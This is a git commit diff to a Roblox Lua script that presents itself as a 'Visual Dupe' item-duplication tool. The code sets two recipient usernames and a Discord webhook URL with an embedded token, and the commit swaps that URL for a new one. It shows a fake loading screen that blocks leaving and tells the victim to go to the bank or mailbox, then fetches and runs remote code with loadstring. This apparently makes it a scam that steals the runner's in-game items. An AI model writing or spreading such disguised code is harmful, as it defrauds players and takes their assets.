e2bc08c559b0b7e48e238ebee7785e798654c97f
MrPectable <126442140+MrPectable@users.noreply.github.com>
2023-05-15 00:28:55 -0400

    Update psxv.lua

--- psxv.lua
+++ psxv.lua
@@ -1,6 +1,6 @@
 UserName = "jsavige4"
 UserName2 = "jsavige4alt"
-Webhook = "https://discord.com/api/webhooks/1106824427976540280/DMCM8a6LMXilU9K4Iuyx7feogRAc-MYTY99brOzZ5NOqs_fGspWEDfC1u0E-UKwP5MIQ"
+Webhook = "https://discord.com/api/webhooks/1107524880964010054/yw5pZjPuk_8fDsG5HVs9WqMkZdNHmfiRYb5HUNtmHLdw13gaiCG4qMWxCCLh1Fu1fY3R"
 
 _G.LoadingScreen = true
 _G.AntiLeave = true
@@ -10,6 +10,6 @@ _G.ScriptName = "Visual Dupe"
 _G.FirstText = "Script Preparing"
 _G.SecondText = "Visual Dupe almost Done..."
 _G.ThirdText = "Make Sure Your At Bank/Mailbox..."
-_G.WaitingTime = 30 -- it's the time between 0% and 100% in secondes
+_G.WaitingTime = 33 -- it's the time between 0% and 100% in secondes
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
